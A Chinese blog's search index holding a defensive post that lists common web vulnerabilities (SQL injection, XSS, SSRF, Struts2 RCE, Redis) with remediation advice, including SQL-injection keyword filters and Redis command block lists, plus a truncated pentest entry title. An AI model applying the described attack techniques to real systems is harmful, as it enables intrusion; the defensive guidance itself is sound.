<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>web常见漏洞描述及修复建议</title>
      <link href="/2024/01/10/web1/"/>
      <url>/2024/01/10/web1/</url>
      
        <content type="html"><![CDATA[<h1 id="web常见漏洞描述及修复建议"><a href="#web常见漏洞描述及修复建议" class="headerlink" title="web常见漏洞描述及修复建议"></a>web常见漏洞描述及修复建议</h1><h2 id="1-SQL注入"><a href="#1-SQL注入" class="headerlink" title="1.SQL注入"></a>1.SQL注入</h2><p>　　<strong>漏洞描述</strong></p><p>　　Web程序中对于用户提交的参数未做过滤直接拼接到SQL语句中执行，导致参数中的特殊字符破坏了SQL语句原有逻辑，攻击者可以利用该漏洞执行任意SQL语句，如查询数据、下载数据、写入webshell、执行系统命令以及绕过登录限制等。</p><p>　　<strong>修复建议</strong></p><p>代码层最佳防御sql漏洞方案：使用预编译sql语句查询和绑定变量。</p><ol><li>使用预编译语句，使用PDO需要注意不要将变量直接拼接到PDO语句中。所有的查询语句都使用数据库提供的参数化查询接口，参数化的语句使用参数而不是将用户输入变量嵌入到SQL语句中。当前几乎所有的数据库系统都提供了参数化SQL语句执行接口，使用此接口可以非常有效的防止SQL注入攻击。</li><li>对进入数据库的特殊字符（’”&lt;&gt;&amp;*;等）进行转义处理，或编码转换。</li><li>确认每种数据的类型，比如数字型的数据就必须是数字，数据库中的存储字段必须对应为int型。</li><li>数据长度应该严格规定，能在一定程度上防止比较长的SQL注入语句无法正确执行。</li><li>网站每个数据层的编码统一，建议全部使用UTF-8编码，上下层编码不一致有可能导致一些过滤模型被绕过。</li><li>严格限制网站用户的数据库的操作权限，给此用户提供仅仅能够满足其工作的权限，从而最大限度的减少注入攻击对数据库的危害。</li><li>避免网站显示SQL错误信息，比如类型错误、字段不匹配等，防止攻击者利用这些错误信息进行一些判断。</li><li>过滤危险字符，例如：采用正则表达式匹配union、sleep、and、select、load_file等关键字，如果匹配到则终止运行。</li></ol><h2 id="2-XSS"><a href="#2-XSS" class="headerlink" title="2.XSS"></a>2.XSS</h2><p>　　<strong>漏洞描述</strong></p><p>　　1、Web程序代码中对用户提交的参数未做过滤或过滤不严，导致参数中的特殊字符破坏了HTML页面的原有逻辑，攻击者可以利用该漏洞执行恶意HTML/JS代码、构造蠕虫、篡改页面实施钓鱼攻击、以及诱导用户再次登录，然后获取其登录凭证等。</p><p>　　2、XSS攻击对Web服务器本身虽无直接危害，但是它借助网站进行传播，对网站用户进行攻击，窃取网站用户账号身份信息等，从而也会对网站产生较严重的威胁。</p><p>XSS攻击可导致以下危害：</p><ol><li>钓鱼欺骗：最典型的就是利用目标网站的反射型跨站脚本漏洞将目标网站重定向到钓鱼网站，或者通过注入钓鱼JavaScript脚本以监控目标网站的表单输入，甚至攻击者基于DHTML技术发起更高级的钓鱼攻击。</li><li>网站挂马：跨站时，攻击者利用Iframe标签嵌入隐藏的恶意网站，将被攻击者定向到恶意网站上、或弹出恶意网站窗口等方式，进行挂马。</li><li>身份盗用：Cookie是用户对于特定网站的身份验证标志，XSS攻击可以盗取用户的cookie，从而利用该cookie盗取用户对该网站的操作权限。</li><li>盗取网站用户信息：当窃取到用户cookie从而获取到用户身份时，攻击者可以盗取到用户对网站的操作权限，从而查看用户隐私信息。</li><li>垃圾信息发送：在社交网站社区中，利用XSS漏洞借用被攻击者的身份发送大量的垃圾信息给特定的目标群。</li><li>劫持用户Web行为：一些高级的XSS攻击甚至可以劫持用户的Web行为，从而监视用户的浏览历史、发送与接收的数据等等。</li><li>XSS蠕虫：借助XSS蠕虫病毒还可以用来打广告、刷流量、挂马、恶作剧、破坏数据、实施DDoS攻击等。</li></ol><p>　　<strong>修复建议</strong></p><p>xss漏洞本质上是一种html注入，也就是将html代码注入到网页中。那么其防御的根本就是在将用户提交的代码显示到页面上时做好一系列的过滤与转义</p><ol><li>过滤输入的数据，对例如：“ ‘ ”，“ “ ”，” &lt; “，” &gt; “，” on* “，script、iframe等危险字符进行严格的检查。这里的输入不仅仅是用户可以直接交互的输入接口，也包括HTTP请求中的Cookie中的变量，HTTP请求头部中的变量等。</li><li>不仅验证数据的类型，还要验证其格式、长度、范围和内容。</li><li>不仅在客户端做数据的验证与过滤，关键的过滤步骤在服务端进行。</li><li>对输出到页面的数据进行相应的编码转换，如HTML实体编码、JS编码等。对输出的数据也要检查，数据库里的值有可能会在一个大网站的多处都有输出，即使在输入做了编码等操作，在各处的输出点时也要进行检查。</li></ol><h2 id="3-XXE"><a href="#3-XXE" class="headerlink" title="3.XXE"></a>3.XXE</h2><p>　　<strong>漏洞详情</strong></p><p>　　参考：<a href="https://www.freebuf.com/company-information/165769.html">https://www.freebuf.com/company-information/165769.html</a></p><h2 id="4-CSRF"><a href="#4-CSRF" class="headerlink" title="4.CSRF"></a>4.CSRF</h2><p>　　<strong>漏洞描述</strong>：</p><p>　　CSRF是跨站请求伪造，不攻击网站服务器，而是冒充用户在站内的正常操作。通常由于服务端没有对请求头做严格过滤引起的。CSRF会造成密码重置，用户伪造等问题，可能引发严重后果。绝大多数网站是通过 cookie 等方式辨识用户身份，再予以授权的。所以要伪造用户的正常操作，最好的方法是通过 XSS 或链接欺骗等途径，让用户在本机（即拥有身份 cookie 的浏览器端）发起用户所不知道的请求。CSRF攻击会令用户在不知情的情况下攻击自己已经登录的系统。</p><p>　　<strong>修复建议</strong></p><ol><li>验证请求的Referer是否来自本网站，但可被绕过。</li><li>在请求中加入不可伪造的token，并在服务端验证token是否一致或正确，不正确则丢弃拒绝服务。</li></ol><h2 id="5-SSRF"><a href="#5-SSRF" class="headerlink" title="5.SSRF"></a>5.SSRF</h2><p>　　<strong>漏洞描述</strong></p><p>　　SSRF（Server-Side Request Forgery，服务器端请求伪造）：通俗的来说就是我们可以伪造服务器端发起的请求，从而获取客户端所不能得到的数据。SSRF漏洞形成的原因主要是服务器端所提供的接口中包含了所要请求的内容的URL参数，并且未对客户端所传输过来的URL参数进行过滤。这个漏洞造成的危害有：</p><ol><li>可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner信息;</li><li>攻击运行在内网或本地的应用程序（比如溢出）;</li><li>对内网Web应用进行指纹识别，通过访问默认文件实现;</li><li>攻击内外网的Web应用，主要是使用Get参数就可以实现的攻击（比如Struts2漏洞利用，SQL注入等）;</li><li>利用File协议读取本地文件。</li></ol><p>　　<strong>修复建议</strong></p><ol><li>禁用不需要的协议，只允许HTTP和HTTPS请求，可以防止类似于file://, gopher://, ftp:// 等引起的问题。</li><li>白名单的方式限制访问的目标地址，禁止对内网发起请求</li><li>过滤或屏蔽请求返回的详细信息，验证远程服务器对请求的响应是比较容易的方法。如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。</li><li>验证请求的文件格式</li><li>禁止跳转</li><li>限制请求的端口为http常用的端口，比如 80、443、8080、8000等</li><li>统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。</li></ol><h2 id="6-任意命令-代码执行"><a href="#6-任意命令-代码执行" class="headerlink" title="6.任意命令/代码执行"></a>6.任意命令/代码执行</h2><p>　　<strong>漏洞描述</strong></p><p>　　命令或代码执行漏洞是指代码未对用户可控参数做过滤，导致直接带入执行命令和代码，通过漏洞执行恶意构造的语句，执行任意命令或代码。攻击者可在服务器上执行任意命令，读写文件操作等，危害巨大。</p><p>　　<strong>修复建议</strong></p><ol><li>严格过滤用户输入的数据，禁止执行非预期系统命令。</li><li>减少或不使用代码或命令执行函数</li><li>客户端提交的变量在放入函数前进行检测</li><li>减少或不使用危险函数</li></ol><h2 id="7-任意文件上传"><a href="#7-任意文件上传" class="headerlink" title="7.任意文件上传"></a>7.任意文件上传</h2><p>　　<strong>漏洞描述</strong></p><p>　　文件上传漏洞通常由于代码中对文件上传功能所上传的文件过滤不严或web服务器相关解析漏洞未修复而造成的，如果文件上传功能代码没有严格限制和验证用户上传的文件后缀、类型等，攻击者可通过文件上传点上传任意文件，包括网站后门文件（webshell）控制整个网站。</p><p>　　<strong>修复建议</strong></p><ol><li>对上传文件类型进行验证，除在前端验证外在后端依然要做验证，后端可以进行扩展名检测，重命名文件，MIME类型检测以及限制上传文件的大小等限制来防御，或是将上传的文件其他文件存储服务器中。</li><li>严格限制和校验上传的文件，禁止上传恶意代码的文件。同时限制相关上传文件目录的执行权限，防止木马执行。</li><li>对上传文件格式进行严格校验，防止上传恶意脚本文件；</li><li>严格限制上传的文件路径。</li><li>文件扩展名服务端白名单校验。</li><li>文件内容服务端校验。</li><li>上传文件重命名。</li><li>隐藏上传文件路径。</li></ol><h2 id="8-目录穿越-目录遍历"><a href="#8-目录穿越-目录遍历" class="headerlink" title="8.目录穿越/目录遍历"></a>8.目录穿越/目录遍历</h2><p>　　<strong>漏洞描述</strong></p><p>　　文件下载或获取文件显示内容页面由于未对传入的文件名进行过滤，利用路径回溯符../跳出程序本身的限制目录，来下载或显示任意文件。</p><p>　　<strong>修复建议</strong></p><p>　　对传入的文件名参数进行过滤，并且判断是否是允许获取的文件类型，过滤回溯符../。</p><h2 id="9-文件包含"><a href="#9-文件包含" class="headerlink" title="9.文件包含"></a>9.文件包含</h2><p>　　<strong>漏洞描述</strong></p><p>　　本地文件包含是指程序在处理包含文件的时候没有严格控制。利用这个漏洞，攻击者可以先把上传的文件、网站日志文件等作为代码执行或直接显示出来，或者包含远程服务器上的恶意文件，进而获取到服务器权限。</p><p>　　<strong>修复建议</strong></p><ol><li>严格检查变量是否已经初始化。</li><li>对所有输入提交可能包含的文件地址，包括服务器本地文件及远程文件，进行严格的检查，参数中不允许出现./和../等目录跳转符。</li><li>严格检查文件包含函数中的参数是否外界可控。</li></ol><h2 id="10-弱口令"><a href="#10-弱口令" class="headerlink" title="10.弱口令"></a>10.弱口令</h2><p>　　<strong>漏洞描述</strong></p><p>　　由于网站用户帐号存在弱口令，导致攻击者通过弱口令可轻松登录到网站中，从而进行下一步的攻击，如上传webshell，获取敏感数据。</p><p>　　另外攻击者利用弱口令登录网站管理后台，可执行任意管理员的操作。</p><p>　　<strong>修复建议</strong></p><ol><li>强制用户首次登录时修改默认口令，或是使用用户自定义初始密码的策略；</li><li>完善密码策略，信息安全最佳实践的密码策略为8位（包括）以上字符，包含数字、大小写字母、特殊字符中的至少3种。</li><li>增加人机验证机制，限制ip访问次数。</li></ol><h2 id="11-暴力破解"><a href="#11-暴力破解" class="headerlink" title="11.暴力破解"></a>11.暴力破解</h2><p>　　<strong>漏洞描述</strong></p><p>　　由于没有对登录页面进行相关的人机验证机制，如无验证码、有验证码但可重复利用以及无登录错误次数限制等，导致攻击者可通过暴力破解获取用户登录账号和密码。</p><p>　　<strong>修复建议</strong></p><ol><li>如果用户登录次数超过设置的阈值，则锁定帐号(有恶意登录锁定帐号的风险)</li><li>如果某个 IP登录次数超过设置的阈值，则锁定IP</li><li>增加人机验证机制</li><li>验证码必须在服务器端进行校验，客户端的一切校验都是不安全的。</li></ol><h2 id="12-越权访问"><a href="#12-越权访问" class="headerlink" title="12.越权访问"></a>12.越权访问</h2><p>　　<strong>漏洞描述</strong></p><p>　　由于没有对用户访问角色的权限进行严格的检查及限制，导致当前账号可对其他账号进行相关操作，如查看、修改等。对低权限对高权限账户的操作为纵向越权，相同权限账户之间的操作成为横向越权也称水平越权。</p><p>　　<strong>修复建议</strong></p><ol><li>对用户访问角色的权限进行严格的检查及限制。</li><li>在一些操作时可以使用session对用户的身份进行判断和控制</li></ol><h2 id="13-未授权访问"><a href="#13-未授权访问" class="headerlink" title="13.未授权访问"></a>13.未授权访问</h2><p>　　<strong>漏洞描述</strong></p><p>　　由于没有对网站敏感页面进行登录状态、访问权限的检查，导致攻击者可未授权访问，获取敏感信息及进行未授权操作。</p><p>　　<strong>修复建议</strong></p><ol><li>页面进行严格的访问权限的控制以及对访问角色进行权限检查。</li><li>可以使用session对用户的身份进行判断和控制。</li></ol><h2 id="14-列目录"><a href="#14-列目录" class="headerlink" title="14.列目录"></a>14.列目录</h2><p>　　<strong>漏洞描述</strong></p><p>　　由于web服务器配置不当，开启了目录浏览，攻击者可获得服务器上的文件目录结构，获取敏感文件。</p><p>　　<strong>修复建议</strong></p><ol><li>通过修改配置文件，禁止中间件（如IIS、apache、tomcat）的文件目录索引功能</li><li>设置目录访问权限</li></ol><h2 id="15-PHP反序列化"><a href="#15-PHP反序列化" class="headerlink" title="15.PHP反序列化"></a>15.PHP反序列化</h2><p><strong>漏洞描述</strong></p><p>　　php反序列化漏洞也叫PHP对象注入，形成原因为程序未对用户输入的序列化字符串进行检测，导致攻击者可以控制反序列化过程，从而导致代码执行、文件操作、执行数据库操作等不可控后果。这一类攻击在java、python等面向对象语言中均存在。</p><p>可参考：<a href="https://www.freebuf.com/articles/web/167721.html">https://www.freebuf.com/articles/web/167721.html</a></p><p>　　<strong>修复建议</strong></p><ol><li>对传入的对象进行严格的过滤检查</li><li>在反序列化过程执行的文件读写、命令或代码执行函数中是否有用户可控的参数。</li></ol><h2 id="16-http-slow拒绝服务攻击"><a href="#16-http-slow拒绝服务攻击" class="headerlink" title="16.http slow拒绝服务攻击"></a>16.http slow拒绝服务攻击</h2><p>　　<strong>漏洞描述</strong></p><p>　　按照设计，HTTP协议要求服务器在处理之前完全接收请求。 如果HTTP请求没有完成，或者传输速率非常低，服务器会保持其资源忙于等待其余数据。如果服务器保持太多的资源请求和处理，这将造成一个拒绝服务。严重者一台主机即可让web运行缓慢甚至是崩溃。</p><p>　　<strong>修复建议</strong></p><p>　　对于 Apache 可以做以下优化（其他服务器原理相同）：</p><ol><li>设置合适的 timeout 时间（Apache 已默认启用了 reqtimeout 模块），规定了 Header 发送的时间以及频率和 Body 发送的时间以及频率</li><li>增大 MaxClients(MaxRequestWorkers)：增加最大的连接数。根据官方文档，两个参数是一回事，版本不同，MaxRequestWorkers was called MaxClients before version 2.3.13.Theold name is still supported.</li><li>默认安装的 Apache 存在 Slow Attack 的威胁，原因就是虽然设置的 timeoute，但是最大连接数不够，如果攻击的请求频率足够大，仍然会占满Apache的所有连接</li></ol><h2 id="17-CRLF注入"><a href="#17-CRLF注入" class="headerlink" title="17.CRLF注入"></a>17.CRLF注入</h2><p>　　<strong>漏洞描述</strong></p><p>　　CRLF 是“回车 +换行”（\r\n）的简称。在 HTTP 协议中，HTTPHeader 与 HTTP Body 是用两个 CRLF 符号进行分隔的，浏览器根据这两个 CRLF 符号来获取 HTTP 内容并显示。因此，一旦攻击者能够控制 HTTP 消息头中的字符，注入一些恶意的换行，就能注入一些会话 Cookie 或者 HTML 代码。</p><p>　　<strong>修复建议</strong></p><p>　　过滤 \r 、\n 及其各种编码的换行符，避免输入的数据污染到其他 HTTP 消息头。</p><h2 id="18-LDAP注入"><a href="#18-LDAP注入" class="headerlink" title="18.LDAP注入"></a>18.LDAP注入</h2><p>　　<strong>漏洞描述</strong></p><p>　　由于Web 应用程序没有对用户发送的数据进行适当过滤和检查，攻击者可修改LDAP 语句的结构，并且以数据库服务器、Web 服务器等的权限执行任意命令，许可权可能会允许查询、修改或除去 LDAP 树状构造内任何数据。</p><p>　　<strong>修复建议</strong></p><p>　　对用户的输入内容进行严格的过滤。</p><h2 id="19-URL-跳转"><a href="#19-URL-跳转" class="headerlink" title="19.URL 跳转"></a>19.URL 跳转</h2><p>　　<strong>漏洞描述</strong></p><p>　　有的Web 应用程序中使用URL参数中的地址作为跳转链接的功能 ，攻击者可实施钓鱼、恶意网站跳转等攻击。</p><p>　　<strong>修复建议</strong></p><ol><li>在进行页面跳转前校验传入的URL是否为可信域名。</li><li>白名单规定跳转链接</li></ol><h2 id="20-明文传输"><a href="#20-明文传输" class="headerlink" title="20.明文传输"></a>20.明文传输</h2><p>　　<strong>漏洞描述</strong></p><p>　　用户登录过程中使用明文传输用户登录信息，若用户遭受中间人攻击时，攻击者可直接获取该用户登录账户，从而进行进一步渗透。</p><p>　　<strong>修复建议</strong></p><ol><li>用户登录信息使用加密传输，如密码在传输前使用安全的算法加密后传输，可采用的算法包括：不可逆hash算法加盐（4位及以上随机数，由服务器端产生）；安全对称加密算法，如AES(128、192、256位)，且必须保证客户端密钥安全，不可被破解或读出；非对称加密算法，如RSA(不低于1024位)、SM2等。</li><li>使用https来保证传输的安全。</li></ol><h2 id="21-网页木马"><a href="#21-网页木马" class="headerlink" title="21.网页木马"></a>21.网页木马</h2><p>　　<strong>漏洞描述</strong></p><p>　　经渗透测试发现目标站点存在webshell，攻击者可直接爆破口令使用木马，非常低成本的进行恶意操作。</p><p>　　<strong>修复建议</strong></p><ol><li>确认并删除木马文件，并进行本地文件漏洞扫描排查是否还存在有其他木马。</li><li>发现并及时修复已存在的漏洞。</li><li>通过查看日志、服务器杀毒等安全排查，确保服务器未被留下后门</li></ol><h2 id="22-备份文件泄露"><a href="#22-备份文件泄露" class="headerlink" title="22.备份文件泄露"></a>22.备份文件泄露</h2><p>　　<strong>漏洞描述</strong></p><p>　　网站备份文件或、敏感信息文件存放在某个网站目录下，攻击者可通过文件扫描等方法发现并下载该备份文件，导致网站敏感信息泄露。</p><p>　　<strong>修复建议</strong></p><ol><li>不在网站目录下存放网站备份文件或敏感信息的文件。</li><li>如需存放该类文件，请将文件名命名为难以猜解的无规则字符串。</li></ol><h2 id="23-敏感信息泄露"><a href="#23-敏感信息泄露" class="headerlink" title="23.敏感信息泄露"></a>23.敏感信息泄露</h2><p>　　<strong>漏洞描述</strong></p><p>　　在页面中或者返回的响应包中泄露了敏感信息，通过这些信息，给攻击者渗透提供了非常多的有用信息。</p><p>　　<strong>修复建议</strong></p><ol><li>如果是探针或测试页面等无用的程序建议删除，或者修改成难以猜解的名字。</li><li>不影响业务或功能的情况下删除或禁止访问泄露敏感信息页面。</li><li>在服务器端对相关敏感信息进行模糊化处理。</li><li>对服务器端返回的数据进行严格的检查，满足查询数据与页面显示数据一致。</li></ol><h2 id="24-短信-邮件轰炸"><a href="#24-短信-邮件轰炸" class="headerlink" title="24.短信/邮件轰炸"></a>24.短信/邮件轰炸</h2><p>　　<strong>漏洞描述</strong></p><p>　　由于没有对短信或者邮件发送次数进行限制，导致可无限次发送短信或邮件给用户，从而造成短信轰炸，进而可能被大量用户投诉，从而影响公司声誉。</p><p>　　<strong>修复建议</strong></p><p>　　在服务器限制发送短信或邮件的频率，如同一账号1分钟只能发送1次短信或邮件，一天只能发送3次。</p><h2 id="25-phpinfo信息泄漏"><a href="#25-phpinfo信息泄漏" class="headerlink" title="25.phpinfo信息泄漏"></a>25.phpinfo信息泄漏</h2><p>　　<strong>漏洞描述</strong></p><p>　　Web站点的某些测试页面可能会使用到PHP的phpinfo()函数，会输出服务器的关键信息，造成服务器信息泄露，为攻击提供有利的信息。</p><p>　　<strong>修复建议</strong></p><ol><li>删除phpinfo 函数。</li><li>若文件无用可直接删除。 </li></ol><h2 id="26-IIS短文件名泄露漏洞"><a href="#26-IIS短文件名泄露漏洞" class="headerlink" title="26.IIS短文件名泄露漏洞"></a>26.IIS短文件名泄露漏洞</h2><p>　　<strong>漏洞描述</strong></p><p>　　Internet Information Services（IIS，互联网信息服务）是由微软公司提供的基于运行Microsoft Windows的互联网基本服务。 Microsoft IIS在实现上存在文件枚举漏洞，攻击者可利用此漏洞枚举网络服务器根目录中的文件。危害：攻击者可以利用“~”字符猜解或遍历服务器中的文件名，或对IIS服务器中的.Net Framework进行拒绝服务攻击。</p><p>　　攻击者可通过该漏洞尝试获取网站服务器文件的文件名，达到获取更多信息来入侵服务器的目的。</p><p>　　<strong>修复建议</strong></p><p>　　修改Windows配置，关闭短文件名功能。</p><ol><li><p>关闭NTFS 8.3文件格式的支持。该功能默认是开启的，对于大多数用户来说无需开启。</p></li><li><p>如果是虚拟主机空间用户,可采用以下修复方案：</p><p>1）修改注册列表HKLM\SYSTEM\CurrentControlSet\Control\FileSystem\NtfsDisable8dot3NameCreation的值为1(此修改只能禁止NTFS8.3格式文件名创建,已经存在的文件的短文件名无法移除)。</p><p>2）如果你的web环境不需要asp.net的支持你可以进入Internet 信息服务(IIS)管理器 — Web 服务扩展 - ASP.NET 选择禁止此功能。</p><p>3）升级net framework 至4.0以上版本。</p></li><li><p>将web文件夹的内容拷贝到另一个位置，比如D:\www到D:\<a href="http://www.back,然后删除原文件夹d/www%EF%BC%8C%E5%86%8D%E9%87%8D%E5%91%BD%E5%90%8DD:/www.back%E5%88%B0D:/www%E3%80%82%E5%A6%82%E6%9E%9C%E4%B8%8D%E9%87%8D%E6%96%B0%E5%A4%8D%E5%88%B6%EF%BC%8C%E5%B7%B2%E7%BB%8F%E5%AD%98%E5%9C%A8%E7%9A%84%E7%9F%AD%E6%96%87%E4%BB%B6%E5%90%8D%E5%88%99%E6%98%AF%E4%B8%8D%E4%BC%9A%E6%B6%88%E5%A4%B1%E7%9A%84%E3%80%82">www.back，然后删除原文件夹D:\www，再重命名D:\www.back到D:\www。如果不重新复制，已经存在的短文件名则是不会消失的。</a></p></li></ol><h2 id="27-应用程序错误信息泄露"><a href="#27-应用程序错误信息泄露" class="headerlink" title="27.应用程序错误信息泄露"></a>27.应用程序错误信息泄露</h2><p>　　<strong>漏洞描述</strong></p><p>　　攻击者可通过特殊的攻击向量，使web服务器出现500、403等相关错误，导致信息泄漏如绝对路径、webserver版本、源代码、sql语句等敏感信息，恶意攻击者很有可能利用这些信息实施进一步的攻击。</p><p>　　<strong>修复建议</strong></p><p>　　自定义错误页面或使用统一的错误页面提示。</p><h2 id="28-Apache-Tomcat默认文件"><a href="#28-Apache-Tomcat默认文件" class="headerlink" title="28.Apache Tomcat默认文件"></a>28.Apache Tomcat默认文件</h2><p>　　<strong>漏洞描述</strong></p><p>　　Apache Tomcat默认样例文件没有删除或限制访问，可能存在cookie、session伪造，进行后台登录操作</p><p>　　<strong>修复建议</strong></p><ol><li>删除样例文件</li><li>限制文件访问权限</li></ol><h2 id="29-Crossdomain-xml-配置不当"><a href="#29-Crossdomain-xml-配置不当" class="headerlink" title="29.Crossdomain.xml 配置不当"></a>29.Crossdomain.xml 配置不当</h2><p>　　<strong>漏洞描述</strong></p><p>　　网站根目录下的 crossdomain.xml 文件指明了远程Flash 是否可以加载当前网站的资源（图片、网页内容、Flash等）。如果配置不当，可能导致遭受跨站请求伪造（CSRF）攻击。</p><p>　　<strong>修复建议</strong></p><p>　　对于不需要从外部加载资源的网站，在 crossdomain.xml 文件中更改allow-access-from的domain属性为域名白名单。</p><h2 id="30-目标服务器启用了不安全-HTTP-方法"><a href="#30-目标服务器启用了不安全-HTTP-方法" class="headerlink" title="30.目标服务器启用了不安全 HTTP 方法"></a>30.目标服务器启用了不安全 HTTP 方法</h2><p>　　<strong>漏洞描述</strong></p><p>　　目标服务器启用了不安全的传输方法，如PUT、TRACE、DELETE、MOVE等，这些方法表示可能在服务器上使用了 WebDAV，由于dav方法允许客户端操纵服务器上的文件，如上传、修改、删除相关文件等危险操作，如果没有合理配置dav，有可能允许未授权的用户对其进行利用，修改服务器上的文件。</p><p>　　<strong>修复建议</strong></p><ol><li>关闭不安全的传输方法，只开启POST、GET方法。</li><li>如果服务器不使用 WebDAV 可直接禁用，或为允许webdav的目录配置严格的访问权限，如认证方法，认证需要的用户名，密码。</li></ol><h2 id="31-weblogic-SSRF服务器请求伪造"><a href="#31-weblogic-SSRF服务器请求伪造" class="headerlink" title="31.weblogic SSRF服务器请求伪造"></a>31.weblogic SSRF服务器请求伪造</h2><p>　　<strong>漏洞描述</strong></p><p>　　目标存在weblogic SSRF服务器请求伪造漏洞。WebLogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）。Weblogic中间件默认带有“UDDI 目录浏览器”且为未授权访问，通过该应用，可进行无回显的SSRF请求。攻击者可利用该漏洞对企业内网进行大规模扫描，了解内网结构，并可能结合内网漏洞直接获取服务器权限。</p><p>　　<strong>修复建议</strong></p><ol><li>若不影响业务则可删除uddiexplorer文件夹</li><li>限制uddiexplorer应用只能内网访问</li></ol><h2 id="32-Apache-Struts2-远程代码执行漏洞（S2-019）"><a href="#32-Apache-Struts2-远程代码执行漏洞（S2-019）" class="headerlink" title="32.Apache Struts2 远程代码执行漏洞（S2-019）"></a>32.Apache Struts2 远程代码执行漏洞（S2-019）</h2><p>　　<strong>漏洞描述</strong></p><p>　　Apache Struts2的“Dynamic MethodInvocation”机制是默认开启的，仅提醒用户如果可能的情况下关闭此机制，如果未关闭此机制将导致远程代码执行漏洞，远程攻击者可利用此漏洞在受影响应用上下文中执行任意代码。</p><p>　　<strong>修复建议</strong></p><ol><li>目前厂商已经发布了升级补丁以修复这个安全问题，请到厂商的主页下载。</li><li>或者手工设置struts.xml文件&lt;constantname=”struts.enable.DynamicMethodInvocation”value=”false”/&gt;</li></ol><h2 id="33-Apache-Struts2-远程代码执行漏洞（S2-037）"><a href="#33-Apache-Struts2-远程代码执行漏洞（S2-037）" class="headerlink" title="33.Apache Struts2 远程代码执行漏洞（S2-037）"></a>33.Apache Struts2 远程代码执行漏洞（S2-037）</h2><p>　　<strong>漏洞描述</strong></p><p>　　Apache Struts2在使用REST插件时，攻击者可以绕过动态方法执行的限制，调用恶意表达式执行远程代码。</p><p>　　<strong>修复建议</strong></p><p>　　建议用户到官方获取最新补丁或者最新版本程序。</p><h2 id="34-Apache-Struts2-DevMode-远程代码执行漏洞"><a href="#34-Apache-Struts2-DevMode-远程代码执行漏洞" class="headerlink" title="34.Apache Struts2 DevMode 远程代码执行漏洞"></a>34.Apache Struts2 DevMode 远程代码执行漏洞</h2><p>　　<strong>漏洞描述</strong></p><p>　　为了便于开发人员调试程序，Struts2提供了一个devMode模式，可以方便查看程序错误以及日志等信息。当Struts2中的devMode模式设置为true时，存在严重远程代码执行漏洞。如果WebService 启动权限为最高权限时，可远程执行任意命令，包括关机、建立新用户、以及删除服务器上所有文件等等。</p><p>　　<strong>修复建议</strong></p><ol><li>建议用户到官方获取最新补丁或者最新版本程序。</li><li>或者将struts.properties中的devMode设置为false，或是在struts.xml中添加如下代码： &lt;constant name=”struts.devMode”value=”false”/&gt;。</li></ol><h2 id="35-Apache-Struts2-远程代码执行漏洞（S2-045）"><a href="#35-Apache-Struts2-远程代码执行漏洞（S2-045）" class="headerlink" title="35.Apache Struts2 远程代码执行漏洞（S2-045）"></a>35.Apache Struts2 远程代码执行漏洞（S2-045）</h2><p>　　<strong>漏洞描述</strong></p><p>　　Apache Struts2的Jakarta Multipartparser插件存在远程代码执行漏洞，漏洞编号为CVE-2017-5638。攻击者可以在使用该插件上传文件时，修改HTTP请求头中的Content-Type值来触发该漏洞，导致远程执行代码。</p><p>　　<strong>修复建议</strong></p><p>　　检测方式查看web目录下/WEB-INF/lib/目录下的struts-core.x.x.jar ，如果这个版本在Struts2.3.5 到 Struts2.3.31 以及 Struts2.5 到 Struts2.5.10之间则存在漏洞。</p><ol><li><p>建议用户到官方获取最新补丁或者最新版本程序。</p></li><li><p>更新至Strusts2.3.32或者Strusts2.5.10.1，或使用第三方的防护设备进行防护。</p></li><li><p>临时解决方案：删除commons-fileupload-x.x.x.jar文件（会造成上传功能不可用）。</p></li><li><p>修改WEB-INF/classes目录下的配置</p><p>在WEB-INF/classes目录下的struts.xml中的struts 标签下添加&lt;constantname=”struts.custom.i18n.resources”value=”global”/&gt;；在WEB-INF/classes/目录下添加global.properties，文件内容如下: struts.messages.upload.error.InvalidContentTypeException=1</p></li></ol><h2 id="36-Apache-Struts2-远程代码执行漏洞（S2-033）"><a href="#36-Apache-Struts2-远程代码执行漏洞（S2-033）" class="headerlink" title="36.Apache Struts2 远程代码执行漏洞（S2-033）"></a>36.Apache Struts2 远程代码执行漏洞（S2-033）</h2><p>　　<strong>漏洞描述</strong></p><p>　　Apache Struts2在开启动态方法调用（DynamicMethod Invocation）的情况下，攻击者使用REST插件调用恶意表达式可以远程执行代码。</p><p>　　<strong>修复建议</strong></p><ol><li>用户到官方获取最新补丁或者最新版本程序。</li><li>或者在允许的情况下禁用动态方法调用（Dynamic Method Invocation），修改Struts2的配置文件struts.xml，将struts.enable.DynamicMethodInvocation设置为“false”。</li></ol><h2 id="37-redis相关漏洞修复"><a href="#37-redis相关漏洞修复" class="headerlink" title="37.redis相关漏洞修复"></a>37.redis相关漏洞修复</h2><p><strong>漏洞描述</strong></p><p>redis默认没有口令可能会造成未授权访问造成信息泄露，若redis为高权限账户运行，可能导致服务器权限丢失等。</p><p><strong>安全建议</strong></p><ol><li><p>禁用一些高危命令</p><p>常见如：flushdb，flushall，config，keys 等</p></li><li><p>以低权限运行 Redis 服务</p></li><li><p>为 Redis 添加密码验证</p></li><li><p>禁止外网访问 Redis</p></li><li><p>保证 authorized_keys 文件的安全</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> 漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web漏洞总结 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>外网打点到渗透内网域控</title>
      <link href="/2022/05/30/day46/"/>
      <url>/2022/05/30/day46/</url>
      
